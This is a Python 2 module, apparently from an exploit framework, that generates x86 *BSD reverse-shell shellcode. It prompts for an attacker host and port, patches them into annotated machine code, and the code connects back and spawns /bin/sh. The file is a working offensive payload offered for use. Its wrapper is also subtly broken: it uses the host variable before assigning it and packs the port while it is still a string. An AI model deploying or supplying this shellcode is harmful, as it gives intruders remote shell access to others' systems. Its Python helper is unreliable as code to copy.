#####################################################################################
# title         : x86_bsd_reverse-shell-tcp
# description   : Shellcode for x86 *BSD systems that open a reverse shell over TCP
# author        : Leo 'cryptobioz' Depriester <leo.depriester@exadot.fr>
# date          : 2016/07/25
# version       : 1.0
#####################################################################################
import struct, socket
class Shellcode:
    @staticmethod
    def get():
        shellcode = Shellcode.shellcode
        print host.encode("hex")
        
        # Define host
        host = raw_input("Host [127.0.0.1] : ")
        if not host:
            host = "127.0.0.1"
        try:
            host = socket.inet_aton(host)
        except socket.error:
            print "[-] This is not an IP adress."
            exit(1)
        if "\x00" in host:
            print "[-] The hex value of your IP adress contains \\x00."
            exit(1)
        shellcode = shellcode.replace(b"\x68\x7f\x7f\x7f\x7f", b"\x68"+host)
    
        # Define port
        port = raw_input("Port [4444] : ")
        if not port:
            port = 4444      
        port = struct.pack(">H", port)
        if "\x00" in port:
            print "[-] The hex value of your port number (%s) contains \\x00." % port
            exit(1)
        else:
            shellcode = shellcode.replace(b"\x68\xff\x02\x41\x42", b"\x68\xff\x02"+port)
        

        return shellcode
        
    shellcode = (
        "\x68\x7f\x7f\x7f\x7f"   # 0x00000000:     push dword 0x7f7f7f7f ; address = 127.127.127.127
        "\x68\xff\x02\x41\x42"   # 0x00000005:     push dword 0x424102ff ; port = 0x4142
        "\x89\xe7"               # 0x0000000A:     mov edi,esp
        "\x31\xc0"               # 0x0000000C:     xor eax,eax
        "\x50"                   # 0x0000000E:     push eax
        "\x6a\x01"               # 0x0000000F:     push byte +0x1
        "\x6a\x02"               # 0x00000011:     push byte +0x2
        "\x6a\x10"               # 0x00000013:     push byte +0x10
        "\xb0\x61"               # 0x00000015:     mov al,0x61
        "\xcd\x80"               # 0x00000017:     int 0x80 ; socket()
        "\x57"                   # 0x00000019:     push edi
        "\x50"                   # 0x0000001A:     push eax
        "\x50"                   # 0x0000001B:     push eax
        "\x6a\x62"               # 0x0000001C:     push byte +0x62
        "\x58"                   # 0x0000001E:     pop eax
        "\xcd\x80"               # 0x0000001F:     int 0x80 ; connect()
        "\x50"                   # 0x00000021:     push eax
        "\x6a\x5a"               # 0x00000022:     push byte +0x5a
        "\x58"                   # 0x00000024:     pop eax
        "\xcd\x80"               # 0x00000025:     int 0x80 ; dup2()
        "\xff\x4f\xe8"           # 0x00000027:     dec dword [edi-0x18]
        "\x79\xf6"               # 0x0000002A:     jns 0x22
        "\x68\x2f\x2f\x73\x68"   # 0x0000002C:     push dword 0x68732f2f ; //sh
        "\x68\x2f\x62\x69\x6e"   # 0x00000031:     push dword 0x6e69622f ; /bin
        "\x89\xe3"               # 0x00000036:     mov ebx,esp
        "\x50"                   # 0x00000038:     push eax
        "\x54"                   # 0x00000039:     push esp
        "\x53"                   # 0x0000003A:     push ebx
        "\x50"                   # 0x0000003B:     push eax
        "\xb0\x3b"               # 0x0000003C:     mov al,0x3b
        "\xcd\x80"               # 0x0000003E:     int 0x80 ; execve()
    )
